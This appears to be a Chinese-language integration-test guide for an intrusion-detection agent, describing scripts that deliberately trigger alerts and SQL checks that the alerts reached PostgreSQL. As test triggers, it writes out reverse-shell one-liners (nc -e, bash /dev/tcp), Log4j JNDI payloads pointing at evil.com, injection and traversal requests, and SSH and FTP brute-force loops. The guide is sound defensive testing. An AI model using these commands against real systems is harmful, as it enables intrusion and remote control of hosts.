# 脚本化告警触发集成测试

本文档描述如何使用 `scripts/trigger_intrusion_alert/` 目录下的自动化脚本触发告警，验证 Agent → gRPC → server → PostgreSQL 的完整数据写入链路。

---

## 一、概述

### 脚本目录结构

```
scripts/trigger_intrusion_alert/
├── test-all-alerts.sh              # 统一入口，按组调用所有脚本
├── test-dangerous-commands.sh      # eBPF: 高危命令检测 (DataType 6003)
├── test-privilege-escalation.sh    # eBPF: 本地提权检测 (DataType 6006)
├── test-reverse-shell.sh           # eBPF: 反弹Shell检测 (DataType 6004)
├── test-malicious-requests.sh      # eBPF: 恶意请求检测 (DataType 6008)
├── test-file-integrity.sh          # eBPF: 文件完整性告警 (DataType 6009)
├── test-ssh-bruteforce.sh          # Detector: SSH暴力破解 (DataType 6001)
├── test-ftp-bruteforce.sh          # Detector: FTP暴力破解 (DataType 6002)
├── test-ssh-anomaly-login.sh       # Detector: SSH异常登录 (DataType 6005)
├── test-nids.sh                    # NIDS: 网络攻击检测 (DataType 6007)
└── test-scanner.sh                 # Scanner: 恶意文件扫描 (DataType 6061)
```

### 脚本覆盖范围

| 插件 | 脚本 | DataType | 数据库表 |
|------|------|----------|---------|
| ebpf_base_detector | test-dangerous-commands.sh | 6003 | alert_dangerous_command |
| ebpf_base_detector | test-reverse-shell.sh | 6004 | alert_reverse_shell |
| ebpf_base_detector | test-privilege-escalation.sh | 6006 | alert_privilege_escalation |
| ebpf_base_detector | test-malicious-requests.sh | 6008 | alert_malicious_request |
| ebpf_base_detector | test-file-integrity.sh | 6009 | alert_file_integrity |
| detector | test-ssh-bruteforce.sh | 6001 | alert_brute_force |
| detector | test-ftp-bruteforce.sh | 6002 | alert_brute_force |
| detector | test-ssh-anomaly-login.sh | 6005 | alert_abnormal_login |
| nids | test-nids.sh | 6007 | alert_network_attack |
| scanner | test-scanner.sh | 6061 | alert_malware_scan |

### 数据流

```
Agent                          server Server                    PostgreSQL
┌──────────────┐  gRPC stream  ┌──────────────┐  GORM          ┌──────────────┐
│ ebpf_base_   │──────────────→│ transfer.go  │──────────────→ │ alert_*      │
│   detector   │  PackagedData │   mapper/    │  INSERT        │              │
│ detector     │               │  repository/ │                │              │
│ nids         │               │              │                │              │
│ scanner      │               │              │                │              │
└──────────────┘               └──────────────┘                └──────────────┘

脚本触发                        Agent 采集/检测                   数据库验证
┌──────────────┐               ┌──────────────┐                ┌──────────────┐
│ test-*.sh    │──→ 系统行为 ──→│ eBPF/日志/   │──→ gRPC ──→   │ SQL 查询     │
│              │               │ 流量捕获     │                │ alert_* 表   │
└──────────────┘               └──────────────┘                └──────────────┘
```

---

## 二、环境准备

### 2.1 前置条件

- Linux 操作系统（Ubuntu/CentOS）
- Go 编译环境
- root 权限（Agent 运行及脚本执行均需要）
- PostgreSQL 数据库（本地）
- 内核版本 >= 5.x，存在 `/sys/kernel/btf/vmlinux`（eBPF 相关测试）

### 2.2 依赖安装

以下依赖仅针对告警测试，按测试需求安装：

| 依赖 | 用途 | 安装命令 | 需要的脚本 |
|------|------|---------|-----------|
| nc (netcat) | 反弹 Shell + 恶意请求测试 | `sudo apt install netcat-openbsd` | test-reverse-shell.sh, test-malicious-requests.sh |
| nc.traditional | 反弹 Shell nc -e 测试 | `sudo apt install netcat-traditional` | test-reverse-shell.sh |
| python3 | 反弹 Shell Python dup2 测试 | 系统自带 | test-reverse-shell.sh |
| sshpass | SSH 暴力破解测试 | `sudo apt install sshpass` | test-ssh-bruteforce.sh |
| vsftpd | FTP 暴力破解测试 | `sudo apt install vsftpd && sudo systemctl start vsftpd` | test-ftp-bruteforce.sh |
| Nginx | NIDS 网络攻击检测 | `sudo apt install nginx && sudo systemctl start nginx` | test-nids.sh |
| gcc | 本地提权测试（编译 SUID 程序） | `sudo apt install gcc` | test-privilege-escalation.sh |
| ClamAV | 恶意文件扫描 | `sudo apt install clamav libclamav-dev clamav-freshclam` | test-scanner.sh |
| dnsutils (dig) | 恶意请求 DNS 类测试 | `sudo apt install dnsutils` | test-malicious-requests.sh |

**快速安装所有依赖**（Ubuntu/Debian）：

```bash
sudo apt install -y netcat-openbsd netcat-traditional python3 sshpass vsftpd \
    nginx gcc clamav libclamav-dev clamav-freshclam dnsutils

# 启动必要服务
sudo systemctl start vsftpd nginx

# 更新 ClamAV 病毒库
sudo freshclam
```

### 2.3 数据库准备

确保本地 PostgreSQL 可访问（用户名 `postgres`，密码 `root`），并创建数据库：

```bash
psql -h 127.0.0.1 -p 5432 -U postgres -c "CREATE DATABASE soc;"
```

> server 启动时会自动执行 AutoMigrate 创建所有表，无需手动建表。

### 2.4 修改 server 数据库配置

`/opt/cloudsec/server/conf/server.yaml` 默认的数据库配置指向远程服务器，本地集成测试需修改为本地 PostgreSQL：

```bash
# 备份原始配置
cp /opt/cloudsec/server/conf/server.yaml /opt/cloudsec/server/conf/server.yaml.bak
```

将 `database` 配置改为：

```yaml
database:
  host: 127.0.0.1
  port: 5432
  user: postgres
  password: "root"
  database: soc
```

> **注意**：如果 `server.yaml` 已被之前的测试或部署修改过，请完整检查当前配置与文档一致，特别注意以下字段：
> - `whitelist` 是否已清空（参见 §2.6）
> - scanner task 的扫描路径是否为 `/root/scanner_test`（参见 §8.1）

### 2.5 测试前清理数据

每次测试前清理历史数据，确保结果不受上次测试影响。

**清理测试文件残留**：

```bash
rm -rf /root/scanner_test
rm -f /tmp/suid_test_id /tmp/suid_wrapper /tmp/suid_wrapper.c /tmp/dc003_test
rm -f /etc/cron.d/ebpf_test_cron
```

**清理数据库**（推荐使用脚本）：

```bash
cd /home/work/goProject/src/BeeGuard/agent

# 直接执行（使用默认连接参数：127.0.0.1 / postgres / root）
bash scripts/clean-test-db.sh

# 或通过环境变量覆盖连接参数
DB_HOST=192.168.1.100 DB_PASS=mypass bash scripts/clean-test-db.sh
```

### 2.6 白名单配置

SSH/FTP 暴力破解检测和 SSH 异常登录检测受白名单影响，**默认配置中 `127.0.0.1` 在白名单内**，本地测试需移除。

**集成测试模式（远程 server）**：编辑 `/opt/cloudsec/server/conf/server.yaml`，找到 `object_name: ssh` 和 `object_name: ftp` 对应的 task，将 `data` 字段中的 `"whitelist":["127.0.0.1","::1"]` 改为 `"whitelist":[]`，然后重启 server 和 Agent。如 `whitelist` 已为空数组 `[]`，可跳过此步骤。

**Standalone 模式**：编辑 Agent 本地配置文件中 detector 插件的 `ssh_brute_force.yaml` 和 `ftp_brute_force.yaml`，将 `whitelist` 改为空数组 `[]`。

**SSH 异常登录**：还需确认 `ssh_anomaly_login.yaml` 中 `enabled=true` 且 `anomaly_rules` 已配置可信 IP 白名单（不包含测试发起的 IP）。

---

## 三、启动服务

### 3.1 启动 Nginx（NIDS 测试需要）

NIDS 测试需要 80 端口有 HTTP 服务，确保 Nginx 已启动：

```bash
sudo systemctl start nginx

# 验证端口已监听（推荐方式）
ss -tlnp | grep :80

# 或通过 HTTP 请求验证
curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/
# 返回任意 HTTP 状态码即可（200、403、404 均正常），只要不是 connection refused
```

> **注意**：启动 Nginx 后建议等待 2-3 秒再运行 NIDS 测试脚本。如果 `test-nids.sh` 报告"Nginx 未在 80 端口运行"，请先用 `ss -tlnp | grep :80` 确认端口已监听，然后重新运行脚本。

### 3.2 启动 server Server

打开 **Terminal A**：

```bash
sudo /opt/cloudsec/server/bin/server -config /opt/cloudsec/server/conf/server.yaml
```

**启动成功判定**：

```
INFO  gRPC Server 启动，监听端口 :50051
INFO  [HTTP] HTTP API Server 启动，监听端口 :8081
```

### 3.3 启动 Agent

打开 **Terminal B**。

**首次测试需创建 agent-local.yaml**（已存在则跳过）：

```bash
cat > /opt/cloudsec/agent/agent-local.yaml << 'EOF'
server: "127.0.0.1:50051"
connect_timeout: 30
working_directory: "/opt/cloudsec/agent/data/agent"
plugins_directory: "/opt/cloudsec/agent/plugins"
log_directory: "/opt/cloudsec/agent/logs"
retry_max_count: 10
retry_interval: 5
EOF
```

启动 Agent：

```bash
sudo /opt/cloudsec/agent/bin/agent -config /opt/cloudsec/agent/agent-local.yaml -test
```

> `-test` 参数将 agent_id 固定为 `123456`，便于数据库查询。

**启动成功判定**（依次出现）：

```
agent start running!
Test mode enabled, agent ID: 123456
INFO    transport/connection.go    connected to server    {"server": "127.0.0.1:50051"}
INFO    transport/transfer.go    received config command    {"plugin_count": 6, ...}
INFO    plugin/plugin.go    plugin has been loaded    {"plugin": "ebpf_base_detector", ...}
INFO    plugin/plugin.go    plugin has been loaded    {"plugin": "detector", ...}
INFO    plugin/plugin.go    plugin has been loaded    {"plugin": "nids", ...}
INFO    plugin/plugin.go    plugin has been loaded    {"plugin": "scanner", ...}
INFO    plugin/plugin.go    sync done
```

### 3.4 验证连接

```bash
# 查看在线 Agent
curl -s http://localhost:8081/api/agents | python3 -m json.tool

# 或查询数据库
PGPASSWORD=root psql -h 127.0.0.1 -p 5432 -U postgres -d soc -c \
  "SELECT agent_id, connection_status FROM agent_info WHERE agent_id = '123456';"
```

`connection_status = 1` 表示 Agent 在线。

---

## 四、脚本使用方式

### 4.1 单独执行特定测试

每个脚本可独立运行：

```bash
cd /home/work/goProject/src/BeeGuard/agent

# 示例：仅运行高危命令检测
sudo bash scripts/trigger_intrusion_alert/test-dangerous-commands.sh

# 示例：仅运行 NIDS 测试
sudo bash scripts/trigger_intrusion_alert/test-nids.sh

# 示例：Scanner 准备测试文件
sudo bash scripts/trigger_intrusion_alert/test-scanner.sh prepare
```

**建议执行顺序**：

1. eBPF 类（无外部依赖要求最少）：dangerous-commands → privilege-escalation → reverse-shell → malicious-requests → file-integrity
2. Detector 类（需白名单配置）：ssh-bruteforce → ftp-bruteforce → ssh-anomaly-login
3. NIDS（需 Nginx，§3.1 已启动）：nids
4. Scanner（需在 Agent 启动前准备）：先停止 Agent → 执行 `test-scanner.sh prepare` 创建测试文件 → 重启 Agent → 等待约 30 秒 → 查询数据库验证

> **提示**：Detector 检测有 1-2 分钟延迟，建议在 SSH/FTP 暴力破解脚本执行后先运行其他测试，最后再查询数据库验证 Detector 结果。

---

## 五、eBPF 告警测试（ebpf_base_detector 插件）

> 前提：内核版本 >= 5.x，存在 `/sys/kernel/btf/vmlinux`。

### 5.1 高危命令检测（test-dangerous-commands.sh）

**脚本说明**：执行 4 个高危命令，触发 ebpf_base_detector 的命令匹配规则。

**测试用例**：

| 编号 | Rule ID | 触发命令 | 规则名称 | 严重等级 |
|------|---------|---------|---------|---------|
| 1 | 2001 | `rm -rf /tmp/dc001_nonexistent_test_dir` | 危险删除操作 | critical |
| 2 | 2002 | `cat /etc/passwd > /dev/null` | 敏感文件访问 | high |
| 3 | 2003 | `chmod 777 /tmp/dc003_test` | 危险权限修改 | high |
| 4 | 2009 | `insmod /tmp/nonexistent.ko` | 内核模块操作 | high |

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-dangerous-commands.sh
```

**日志验证**：

查看 ebpf_base_detector 插件日志，确认告警已触发：

```bash
grep -E "rm -rf|cat /etc/passwd|chmod 777|insmod" \
  /opt/cloudsec/agent/logs/plugins/ebpf_base_detector/ebpf_base_detector.log
```

每条规则触发后，日志中应出现包含对应命令关键词的告警记录。

**SQL 验证**：

```sql
SELECT agent_id, host_ip, command, command_type, "user", alert_time, created_at
FROM alert_dangerous_command
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

**判定规则**：
- 记录数 >= 4
- `command` 分别包含 `rm -rf`、`cat /etc/passwd`、`chmod 777`、`insmod`
- `created_at` 为脚本执行时间

> **已知问题（重要）**：脚本使用 `set -e`，第 4 步 `insmod /tmp/nonexistent.ko` 会因命令失败导致脚本提前退出（exit code 1）。**这是预期行为，不代表测试失败。** eBPF 在 exec 阶段已捕获该事件，数据库中 4 条记录均可正常写入。如需避免脚本中断，可将脚本中 `; true` 改为 `|| true`。
>
> **噪声说明**：系统 modprobe 调用（如 systemd 加载内核模块）也会产生告警记录，实际记录数可能远超 4 条。可通过 `command NOT LIKE '%modprobe%'` 过滤系统噪声。

### 5.2 本地提权检测（test-privilege-escalation.sh）

**脚本说明**：编译 SUID 测试程序，以非 root 用户执行触发提权告警，同时验证 sudo/su 白名单不误报。

**依赖**：gcc、系统中存在非 root 用户（UID >= 1000）

**测试用例**：

| 编号 | 操作 | 预期结果 |
|------|------|---------|
| 1 | 非 root 用户执行 SUID 程序 | 应触发提权告警 |
| 2 | sudo id | 不应触发（sudo 在白名单） |
| 3 | su - root -c "id" | 不应触发（su 在白名单） |

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-privilege-escalation.sh
```

> **注意**：脚本执行 `chown root:root` 和 `chmod 4755` 设置 SUID 位时会触发高危命令检测（DC003），属于预期行为。脚本执行完毕后会自动清理编译产物。

**预期输出**：

```
测试用户: work (uid=1000)

[准备] 编译 SUID 测试程序
  编译完成: /tmp/suid_wrapper（SUID 已设置）

[1/3] SUID 程序提权（应触发告警）
  执行: su - work -c '/tmp/suid_wrapper'
  完成
[2/3] 白名单验证 — sudo（不应触发告警）
  完成
[3/3] 白名单验证 — su（不应触发告警）
  完成

[清理] 删除测试文件
  已清理
```

**SQL 验证**：

```sql
SELECT agent_id, host_ip, escalated_user, parent_process, process_path, discover_time
FROM alert_privilege_escalation
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

**判定规则**：
- 至少 1 条记录，`process_path` 包含 `/tmp/suid_wrapper`
- 不应出现 `process_path` 为 `sudo` 或 `su` 的记录

> **噪声说明**：系统服务（如 postfix/local）在邮件投递时也可能触发提权告警，实际记录数可能大于 1。可通过 `process_path LIKE '%suid_wrapper%'` 过滤脚本触发的记录。

### 5.3 反弹 Shell 检测（test-reverse-shell.sh）

**脚本说明**：使用 3 种方式触发反弹 Shell，验证 eBPF 对进程 fd 指向网络套接字的检测能力。

**依赖**：netcat-traditional（nc.traditional）、python3

**测试用例**：

| 编号 | 方式 | 监听端口 | 触发命令 |
|------|------|---------|---------|
| RS001 | nc -e | 9001 | `nc.traditional -e /bin/bash 127.0.0.1 9001` |
| RS002 | Python dup2 | 9002 | `python3 -c 'socket+dup2+subprocess.call(["/bin/bash","-i"])'` |
| RS003 | bash /dev/tcp | 9003 | `bash -i >& /dev/tcp/127.0.0.1/9003 0>&1` |

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-reverse-shell.sh
```

> 脚本自动启动 nc 监听、触发反弹、清理进程，无需手动操作多终端。

**预期输出**：

```
[1/3] RS001: nc -e 反弹
  启动监听: nc -lvp 9001
  触发反弹: nc.traditional -e /bin/bash 127.0.0.1 9001
  完成
[2/3] RS002: Python dup2 反弹
  ...
[3/3] RS003: bash /dev/tcp 反弹
  ...
```

**SQL 验证**：

```sql
SELECT agent_id, host_name, victim_ip, command_line, shell_type,
       target_host, target_port, status, event_time
FROM alert_reverse_shell
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

**判定规则**：
- 至少 3 条记录
- `target_host` 为 `127.0.0.1`
- `target_port` 分别为 `9001`、`9002`、`9003`
- `shell_type` 为 `bash`

> **噪声说明**：SSH 暴力破解测试会导致 sshd fork 子进程，其 fd 指向网络套接字，可能被 eBPF 误判为反弹 Shell。如果同时运行了 SSH 暴力破解测试，`alert_reverse_shell` 表中可能出现大量 `shell_type = 'sshd'` 的记录。可通过 `target_port IN (9001, 9002, 9003)` 过滤脚本触发的记录。

### 5.4 恶意请求检测（test-malicious-requests.sh）

**脚本说明**：通过矿池端口连接、DNS 查询已知恶意域名等方式触发恶意请求告警。

**依赖**：nc（netcat-openbsd）、dnsutils（dig，DNS 类测试可选）

**测试用例**：

| 编号 | Rule ID | 触发方式 | 规则名称 | 威胁类型 | 指标类型 |
|------|---------|---------|---------|---------|---------|
| 1 | IOC002 | `nc -w 1 127.0.0.1 3333`（本地监听） | 常见矿池端口 | mining | port |
| 2 | IOC003 | `dig minersns.com`（需 dig） | 已知矿池域名 | mining | domain |
| 3 | IOC004 | `dig test.cobalt-strike.example.com`（需 dig） | 已知C2域名 | c2 | domain |
| 4 | IOC005 | `nc -w 2 185.141.27.100 443` | 已知C2端点 | c2 | ip_port |
| 5 | IOC006 | `dig login.phishing-example.com`（需 dig） | 已知钓鱼域名 | phishing | domain |

> **注意**：
> - IOC002 使用本地 nc 监听确保连接成功触发，但实际测试中端口类检测可能不触发（eBPF connect 事件的匹配机制与 DNS 类不同）
> - IOC005 目标可能不可达，connect 需成功才触发，多数环境不会生效
> - DNS 类规则（IOC003/004/006）依赖 eBPF 捕获 recvfrom/recvmsg，需确保 DNS 解析正常
> - **实际测试中，通常只有 DNS 类（IOC003/004/006）能稳定触发**，port/ip_port 类检测不一定生效

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-malicious-requests.sh
```

**预期输出**：

```
[1/5] IOC002: 常见矿池端口（medium）
  启动本地监听: nc -lvp 3333
  触发连接: nc -w 1 127.0.0.1 3333
  完成
[2/5] IOC003: 已知矿池域名（high）
  触发 DNS 查询: dig minersns.com
  完成
...
```

如果未安装 dig，DNS 类测试会显示"跳过 — 未安装 dig"。

**SQL 验证**：

```sql
SELECT agent_id, host_ip, policy_type, policy_name, malicious_domain,
       malicious_ip, request_count, first_request_time, last_request_time, status
FROM alert_malicious_request
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

**判定规则**：
- 至少 1 条记录（DNS 类最稳定：IOC003/004/006）
- 如果 dig 可用，应有 3 条 DNS 类匹配记录（`malicious_domain` 分别为 `minersns.com`、`test.cobalt-strike.example.com`、`login.phishing-example.com`）
- IOC002（端口类）不一定触发，非必须验证项
- `request_count` >= 1

### 5.5 文件完整性检测（test-file-integrity.sh）

**脚本说明**：对敏感路径（crontab 目录、/etc/hosts）执行创建、修改、删除操作，触发文件完整性告警。

**测试用例**：

| 编号 | 操作 | 文件路径 | 预期 threat_action | 实际触发 |
|------|------|---------|-------------------|---------|
| FI001 | 创建文件 | /etc/cron.d/ebpf_test_cron | create | **是** |
| FI002 | 修改文件 | /etc/cron.d/ebpf_test_cron | modify | **否**（eBPF 规则仅监控 create/rename/delete） |
| FI003 | 删除文件 | /etc/cron.d/ebpf_test_cron | delete | **是** |
| FI004 | 修改文件 | /etc/hosts | modify | **否**（/etc/hosts 不在 sensitive_file_rules.yaml 监控路径中） |

> **说明**：eBPF 文件完整性监控当前仅支持 `create`、`rename`、`delete` 三种操作，不捕获 `modify`（写入已有文件）。同时，监控路径由 `sensitive_file_rules.yaml` 定义，`/etc/hosts` 目前不在规则中。FI002 和 FI004 的目的是验证脚本执行不报错，实际不产生告警记录。

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-file-integrity.sh
```

**预期输出**：

```
[1/4] FI001: crontab 目录创建文件（应触发 create 告警）
  执行: echo '# test' > /etc/cron.d/ebpf_test_cron
  完成
[2/4] FI002: crontab 目录修改文件（应触发 modify 告警）
  ...
[3/4] FI003: crontab 目录删除文件（应触发 delete 告警）
  ...
[4/4] FI004: 修改 /etc/hosts（应触发 modify 告警）
  完成（已恢复原文件）
```

**SQL 验证**：

```sql
SELECT agent_id, host_ip, rule_type, rule_name, threat_level, threat_action,
       file_path, file_name, operator_user, operator_process, alert_time
FROM alert_file_integrity
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

**判定规则**：
- 至少 2 条记录（FI001 create + FI003 delete）
- `file_path` 包含 `/etc/cron.d/ebpf_test_cron`
- `threat_action` 分别为 `create`、`delete`
- `operator_user` 为执行操作的用户
- FI002（modify）和 FI004（/etc/hosts）当前不产生告警记录，属于预期行为

---

## 六、Detector 告警测试（detector 插件）

Detector 插件通过监控系统日志文件（/var/log/auth.log 或 /var/log/secure）检测暴力破解和异常登录。检测器按周期扫描日志，**告警产生通常有 1-2 分钟延迟**。

### 6.1 SSH 暴力破解检测（test-ssh-bruteforce.sh）

**前置条件**：
- 安装 sshpass：`sudo apt install sshpass`
- SSH 服务运行中
- **移除白名单**：默认配置中 `127.0.0.1` 在白名单内（参见 2.6 节）

**脚本说明**：使用 sshpass 发送 10 次错误密码 SSH 登录尝试，超过阈值（默认 6 次）触发暴力破解告警。

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-ssh-bruteforce.sh
```

**预期输出**：

```
[1/1] BF001: SSH 暴力破解（10 次错误密码登录）
  目标: localhost

  [1/10] sshpass -p 'wrong_password' ssh root@localhost
  [2/10] sshpass -p 'wrong_password' ssh root@localhost
  ...
  [10/10] sshpass -p 'wrong_password' ssh root@localhost

  登录尝试完成
```

> **注意**：检测触发通常需要 1-2 分钟（检测器按周期扫描日志），执行完脚本后需等待。

**SQL 验证**：

```sql
SELECT agent_id, host_ip, source_ip, source_location, attack_type, username,
       attempt_count, first_attack_time, attack_time
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ssh'
ORDER BY created_at DESC LIMIT 5;
```

**判定规则**：
- 至少 1 条记录
- `attack_type` 为 `ssh`
- `attempt_count` >= 6
- `source_ip` 为 `127.0.0.1`

### 6.2 FTP 暴力破解检测（test-ftp-bruteforce.sh）

**前置条件**：
- 安装并启动 vsftpd：`sudo apt install vsftpd && sudo systemctl start vsftpd`
- **移除白名单**：默认配置中 `127.0.0.1` 在 FTP 白名单内（参见 2.6 节）

**脚本说明**：使用 curl 发送 10 次错误密码 FTP 登录尝试。

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-ftp-bruteforce.sh
```

**预期输出**：

```
[1/1] BF002: FTP 暴力破解（10 次错误密码登录）
  目标: localhost

  [1/10] curl -u wronguser:wrongpass ftp://localhost/
  ...
  [10/10] curl -u wronguser:wrongpass ftp://localhost/

  登录尝试完成
```

**SQL 验证**：

```sql
SELECT agent_id, source_ip, attack_type, username, attempt_count, attack_time
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ftp'
ORDER BY created_at DESC LIMIT 5;
```

**判定规则**：
- 至少 1 条记录
- `attack_type` 为 `ftp`
- `attempt_count` >= 6
- `source_ip` 为 `127.0.0.1` 或 `::ffff:127.0.0.1`（vsftpd 日志可能记录 IPv6 映射地址）

### 6.3 SSH 异常登录检测（test-ssh-anomaly-login.sh）

**前置条件**（三项全部满足）：
1. `ssh_anomaly_login.yaml` 中 `enabled=true` 且 `anomaly_rules` 至少有一条含 IP 的规则
2. 远程 server 模式下 server.yaml 中 `ssh_anomaly_login` 的 `enabled=true` 且有规则
3. detector 日志出现 `compiled N IPs from M rules`（N > 0, M > 0）

**脚本说明**：使用本机非回环 IP 通过 SSH 密钥登录，触发异常登录告警（该 IP 不在可信白名单中）。脚本会自动生成 SSH 密钥对（如不存在）并配置 authorized_keys。

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-ssh-anomaly-login.sh
```

**预期输出**：

```
本机 IP: 192.168.1.100

  检测器状态: compiled 3 IPs from 1 rules

[1/1] AL001: 从非白名单 IP 成功 SSH 登录
  执行: ssh -i ~/.ssh/id_rsa root@192.168.1.100 'echo login success'
  完成
```

**SQL 验证**：

```sql
SELECT agent_id, host_ip, source_ip, source_location, login_user, login_time, risk_level
FROM alert_abnormal_login
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

**判定规则**：
- 至少 1 条记录
- `source_ip` 为本机非回环 IP
- `login_user` 为 `root`
- `risk_level` 为 `critical`

> **注意**：脚本可能输出警告"未在日志中找到规则加载记录，检测器可能未生效"。如果数据库中确有告警记录，可忽略此警告——这是脚本日志匹配模式与实际检测器日志格式不完全一致所致，不影响检测功能。

---

## 七、NIDS 告警测试（nids 插件）

### 7.1 网络入侵检测（test-nids.sh）

**前置条件**：
- Nginx 运行在 80 端口（§3.1 已启动，若未启动请执行 `sudo systemctl start nginx`）
- Agent 已启动且 nids 插件已加载
- nids 配置中 `interface` 为 `lo`（抓取本地回环流量）

**脚本说明**：发送 12 个模拟攻击请求（含重复攻击计数验证），覆盖 NIDS 规则集中的主要攻击类型。脚本通过检查 nids 日志文件自动判定每个测试的 Pass/Fail。

**测试用例**：

| 编号 | SID | 攻击类型 | 严重等级 | 触发方式 |
|------|-----|---------|---------|---------|
| 1 | 1001 | Log4j2 JNDI 注入 — Header | critical | `curl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}'` |
| 2 | 1002 | Log4j2 JNDI 注入 — URI | critical | `curl -g --path-as-is 'http://127.0.0.1/${jndi:ldap://evil.com/a}'` |
| 3 | 2001 | SQL 注入 — UNION SELECT | high | `curl 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'` |
| 4 | 3001 | 命令注入 | critical | `curl 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'` |
| 5 | 4001 | 路径遍历 — etc/passwd | high | `curl --path-as-is 'http://127.0.0.1/../../../../etc/passwd'` |
| 6 | 4003 | 路径遍历 — 深层遍历 | high | 与 Test 5 同时触发 |
| 7 | 5001 | Struts2 OGNL 注入 | critical | `curl --path-as-is 'http://127.0.0.1/test%25%7B1+1%7D'` |
| 8 | 5002 | Spring4Shell — Body | critical | `curl -X POST -d 'class.module.classLoader.resources=test'` |
| 9 | 5003 | Fastjson RCE — Body | critical | `curl -X POST -d '{"@type":"com.sun.rowset.JdbcRowSetImpl"}'` |
| 10 | 6001 | 扫描器检测 — SQLMap UA | medium | `curl -A 'sqlmap/1.0'` |
| 11 | 6002 | 扫描器检测 — Nmap UA | medium | `curl -A 'nmap scripting engine'` |
| 12 | — | 重复攻击计数验证 | — | 连续 3 次 Log4j2 Header 攻击 |

**执行方法**：

```bash
sudo bash scripts/trigger_intrusion_alert/test-nids.sh
```

**预期输出**（含 Pass/Fail 统计）：

```
[前置检查]
  Nginx 正常运行
  NIDS 日志文件存在

[1/12] SID 1001: Log4j2 JNDI 注入 — Header（critical）
  执行: curl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
  => 检测到 SID 1001 告警 ✓
[2/12] SID 1002: Log4j2 JNDI 注入 — URI（critical）
  ...
  => 检测到 SID 1002 告警 ✓
...
[12/12] 重复攻击计数验证
  执行: 连续 3 次 Log4j2 JNDI Header 攻击
  => 攻击计数递增正常（最后 count=4） ✓

  总计: 12  通过: 12  失败: 0
所有测试通过！
```

**SQL 验证**：

```sql
SELECT agent_id, host_ip, attacker_ip, target_port, vulnerability_name,
       attack_count, attack_payload, first_attack_time, last_attack_time, created_at
FROM alert_network_attack
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 15;
```

**判定规则**：
- 至少 11 条记录（对应 11 个不同 SID）
- `attacker_ip` 为 `127.0.0.1`
- `target_port` 为 `80`
- `vulnerability_name` 包含对应规则描述
- Log4j2 相关记录的 `attack_count` 随重复攻击递增

> **说明**：实际记录数可能超过 11 条（约 14 条），因为 Test 12 的重复攻击会为同一 SID 创建新记录（`attack_count` 递增），而非更新已有记录。

---

## 八、Scanner 告警测试（scanner 插件）

### 8.1 恶意文件扫描（test-scanner.sh）

**特殊流程**：Scanner 测试与其他测试不同，需要**先创建测试文件，再启动 Agent**。因为 Agent 连接 server 后会自动下发目录扫描任务，测试文件必须在扫描前就位。

> **说明**：默认扫描路径为 `/root/scanner_test`（由 server.yaml 中 scanner task 的 `data: '{"exe":"/root/scanner_test"}'` 控制）。脚本会自动在该目录下创建 EICAR 测试文件。
>
> **重要**：请务必检查 `/opt/cloudsec/server/conf/server.yaml` 中 scanner task 的 `data` 字段，确认路径为 `{"exe":"/root/scanner_test"}` 而非 `{"exe":"/root"}`。如果路径为 `/root`，会扫描整个 home 目录，耗时可能长达数十分钟。

**前置条件**：
- ClamAV 已安装：`sudo apt install clamav libclamav-dev clamav-freshclam`
- 病毒库已更新：`sudo freshclam`
- 病毒库文件位于 `/var/lib/clamav/`

**脚本说明**：脚本支持两个子命令：
- `prepare`：在 `/root/scanner_test` 目录创建 3 个 EICAR 标准测试文件
- `cleanup`：清理测试文件

**EICAR 测试文件**：

| 文件路径 | MD5 |
|---------|-----|
| /root/scanner_test/eicar_test.com | 44d88612fea8a8f36de82e1278abb02f |
| /root/scanner_test/eicar_1.exe | 44d88612fea8a8f36de82e1278abb02f |
| /root/scanner_test/eicar_2.sh | 44d88612fea8a8f36de82e1278abb02f |

**执行方法**：

```bash
# 步骤 1：创建测试文件（Agent 启动前执行）
sudo bash scripts/trigger_intrusion_alert/test-scanner.sh prepare

# 步骤 2：启动（或重启）Agent
sudo /opt/cloudsec/agent/bin/agent -config /opt/cloudsec/agent/agent-local.yaml -test

# 步骤 3：等待扫描完成（小目录约 30 秒，/root 目录可能需要数十分钟）

# 步骤 4：查询数据库验证

# 步骤 5：清理测试文件
sudo bash scripts/trigger_intrusion_alert/test-scanner.sh cleanup
```

**预期输出**（prepare）：

```
[准备] 创建 EICAR 标准测试文件

  已创建: /root/scanner_test/eicar_test.com
  已创建: /root/scanner_test/eicar_1.exe
  已创建: /root/scanner_test/eicar_2.sh

测试文件已就绪

后续步骤：
  1. 启动 Agent 连接 server（scanner 插件会自动接收扫描任务）
  2. 等待约 30 秒，scanner 扫描 /root/scanner_test 目录
  3. 查询 alert_malware_scan 表验证检测结果
```

**SQL 验证**：

```sql
SELECT agent_id, host_ip, threat_type, file_name, file_path, file_size,
       file_md5, detection_engine, malware_family, scan_time, created_at
FROM alert_malware_scan
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

**判定规则**：
- 至少 1 条记录（使用专用小目录时预期 3 条，使用 `/root` 扫描时视目录大小可能仅部分检出）
- `file_md5` 为 `44d88612fea8a8f36de82e1278abb02f`（EICAR 标准 MD5）
- `detection_engine` 为 `ClamAV`
- `threat_type` 非空

---

## 九、完整验证

所有测试执行完毕后，使用以下 SQL 一次性验证所有告警表的数据写入情况：

```sql
